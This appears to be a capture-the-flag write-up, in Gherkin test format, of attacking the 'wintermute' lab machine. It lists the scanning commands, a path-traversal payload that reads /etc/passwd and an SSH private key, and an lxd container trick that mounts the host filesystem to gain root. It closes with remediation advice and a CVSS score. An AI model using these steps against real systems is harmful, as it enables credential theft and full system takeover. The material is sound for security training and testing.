## Version 1.4.1
## Language: en

Feature:
  Toe:
    wintermute
  Location:
    http://192.168.0.105/
  CWE:
    CWE-022: https://cwe.mitre.org/data/definitions/22.html
  Rule:
    Rule-123: https://docs.fluidattacks.com/criteria/vulnerabilities/123/
  Goal:
    Get remote connection and root privileges
  Recommendation:
    Validate that the parameters received by
    the application do not contain relative paths
    Disable insecure functions that allow
    reading of arbitrary files on the server

  Background:
  Hacker's software:
  | <Software name> | <Version>       |
  | parrot O.S      | 2022.2          |
  | Virtualbox      | 6.1.16          |
  | Google Chrome   | 104.0.5112.101  |
  | Nast V.         | 0.2.0           | 
  | Nmap            | 7.92            |

  Toe information:
    Given I am running the "wintwemute.ova" virtual machine Virtualbox

  Scenario: Dynamic detection
    Then I scan my network and search IP to machine Straylight
    """
    sudo nast -m ens33
    """
    And see connected devices
    When I see the ip of the victim machine [evidence] (03.png)
    Then I try scanning the open ports
 
    """
    nmap -p- -sCV  --min-rate 5000 192.168.18.59 -Pn
    """
    Then I see that ports 80 and 6688 are open [evidence] (02.png)
    And I perform a scanning of possible routes
    """
    gobuster dir -u http://192.168.0.105/ -w /usr/share/wordlists/
    directory-list2.3-medium.txt -t 50 -x html,php,txt
    """
    When I see the route "/lavalamp" available [evidence] (03.png)
    Then I see you have a web service [evidence] (04.png)
    When I see that it contains a form [evidence] (05.png)
    Then test the form and see where my request travels to
    And I can see the path "canyoubypassme.php" [evidence] (06.png)

  Scenario: Exploitation
    Then I go to the route found [evidence] (07.png)
    """
    http://192.168.0.105/lavalamp/canyoubypassme.php
    """
    When I inspect the page
    Then I change the "opacity" value from 0.0 to 1.0
    And I get the form to be visible on the website [evidence] (08.png)
    Then I enter a value in the form
    When I receive an empty response [evidence] (09.png)
    Then I will test if it is vulnerable to LFI
    """
    1../../../../etc/passwd
    """
    Then I can see the user "ford" [evidence] (10.png)
    When I apply another payload I get its id_rsa [evidence] (11.png)
    Then I assign write and read permissions on the id_rsa
    """
    chmod 600 id_rsa
    """
    And I get access through ssh with the user "ford" [evidence] (12.png)

  Scenario: Privilege escalation
    And I see that "ford" is a member of the "lxd" group [evidence] (13.png)
    When I download "build-alpine" on my local machine [evidence] (14.png)
    Then I run "build-alpine" to generate an image [evidence] (15.png)
    When I use an "Http" server with "Python"
    """
    python -m http.server 443
    """
    Then I download the ".tar" file to the victim machine [evidence] (16.png)
    """
    wget http://192.168.0.192:443/alpine-v3.16-x8
    """
    When I import the image for "lxd" [evidence] (17.png)
    """
    lxc image import ./alpine-v3.16-x86_64-20220820_1413.tar.gz
    --alias myimage
    """
    Then I start the image inside a new container
    """
    lxc init myimage ignite -c security.privileged=true
    """
    And I mount the container inside the directory "/root"
    """
    lxc config device add ignite mydevice disk source=/ path=/mnt/root
    recursive=root
    """
    When I start the container
    """
    lxc start ignite
    """
    Then I run bash on the container
    """
    lxc exec ignite /bin/sh
    """
    And I have access to the "root" user [evidence] (18.png)

  Scenario: Remediation
    Given that the service is vulnerable to LFI
    Then it is necessary to apply code sanitization

  Scenario: Scoring
    Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    8.0/10 (High) - AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
  Temporal: Attributes that measure the exploit's popularity and fixability
    7.5/10 (High) - E:F/RL:T/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    7.5/10 (High) - CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/MS:C/MC:H/MI:H/MA:H

  Scenario: Correlations
    No correlations have been found to this date 2022-08-23
